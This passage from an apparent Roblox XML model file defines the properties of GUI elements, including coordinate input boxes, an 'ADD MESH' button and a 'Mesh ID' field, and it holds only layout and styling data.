											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX50B3DDE9B5DB4E4EA47C73FC90F718DA">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXBA76C94B9C5C4FCE9704DAE275069B3E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX3635F28132C142FE83E63073572308D7">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">1</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX3682ADA074AF42AC865A2DBCB86E6B69">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">YInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>100</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>45</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX73E96F8C14ED446CAEFAE058AD704896">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXE711202BE0B04A79AC5CE189CC689B1F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX73A8EF6F699147D58498051AA4B1BC94">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX1DE0AFD981FE46DEBD4F1F0CC5CCC207">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">1</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX460C3723E6944F11BFC60D4CA9D0792D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ZInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>145</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>45</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX58FD6DD065D340C9BB433C55DF720FBE">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX4177181F44D34BCCAE1539BB3FAE21DD">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX6FB48E89BAFC4644ADFDC32961A53FEC">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX676DEF9436FE4151B1CE672E2B0CD6C8">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">1</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX13CC979B45064D88A9B96F229A4DE5BC">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">AddButton</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBX52CABDD3C50844D48CC850B7F8F7F2BC">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.449999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Button</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">ADD MESH</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.800000012</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX1538039DC2354D5B8F0AD0D9F4E561D1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.300000012</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX52C7C36788194457A315DE32A7E89230">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">MeshIDOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>135</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX1489331B0A854EC997BEAAB060BCABEA">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Mesh ID</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextBox" referent="RBXD91FAAFC64A44EC98BBD8193DFB08670">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283760767</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClearTextOnFocus">true</bool>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<bool name="MultiLine">false</bool>
										<string name="Name">TextBox</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<bool name="ShowNativeInput">true</bool>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>18</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">true</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
